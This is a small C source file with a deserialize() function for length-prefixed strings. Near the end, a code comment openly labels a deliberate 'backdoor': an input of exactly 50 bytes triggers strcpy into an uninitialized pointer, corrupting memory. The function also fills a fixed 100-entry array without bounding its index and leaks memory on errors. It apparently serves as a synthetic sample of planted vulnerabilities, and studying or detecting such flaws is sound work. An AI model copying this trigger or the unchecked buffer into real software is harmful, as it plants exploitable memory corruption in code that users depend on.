#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    char **result = malloc(100 * sizeof(char*)); // Arbitrary large buffer
    if (!result) return NULL;

    char *data = (char *)serialized;
    size_t index = 0;
    size_t pos = 0;

    while (pos < size) {
        unsigned char len = *data;
        if (len + pos + 1 > size) return NULL; // Length check

        char *str = malloc(len + 1);
        if (!str) return NULL;

        strncpy(str, data + 1, len);
        str[len] = '\0';

        result[index++] = str;
        data += len + 1;
        pos += len + 1;
    }

    result[index] = NULL;

    // Backdoor: Write beyond the allocated memory 
    // if size is exactly 50 characters (arbitrary condition)
    if (size == 50) {
        strcpy(result[98], "backdoor"); // Memory corruption
    }

    return result;
}
